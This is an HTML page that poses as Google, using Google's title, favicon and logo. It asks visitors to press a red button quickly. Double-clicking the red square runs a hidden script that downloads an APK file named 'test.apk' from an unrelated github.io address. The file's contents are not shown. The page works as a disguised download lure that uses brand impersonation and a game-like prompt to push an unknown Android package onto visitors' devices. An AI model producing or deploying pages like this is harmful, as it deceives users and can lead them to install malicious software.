
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Google</title>

  <!-- Favicon -->
  <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSTLNyHEp8ERADDJDy5wXQLoV_Lj0YTmv6eA&s" type="image/png">

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f8f9fa;
      height: 100vh;
      overflow: hidden;
      position: relative;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      user-select: none;
    }
    .logo {
      margin-bottom: 20px;
    }
    .logo img {
      width: 272px;
    }
    .note {
      font-size: 18px;x
      text-align: center;
      color: #202124;
    }
    .red-square {
      width: 20px;
      height: 20px;
      background-color: red;
      border-radius: 8px;
      cursor: pointer;
      position: absolute;
      top: 50%;
      right: 17%;
      transition: transform 0.1s ease;
    }
    .red-square:active {
      transform: scale(0.95);
    }
  </style>
</head>
<body>

  <div class="logo">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Google Logo">
  </div>

  <div class="note">Press the red button as fast as you can</div>

  <div class="red-square" ondblclick="triggerDownload()"></div>

  <script>
    function triggerDownload() {
      const fileUrl = "http://frozzipies.github.io/test.apk";
      const link = document.createElement("a");
      link.href = fileUrl;
      link.download = fileUrl.split("/").pop();
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
  </script>
</body>
</html>
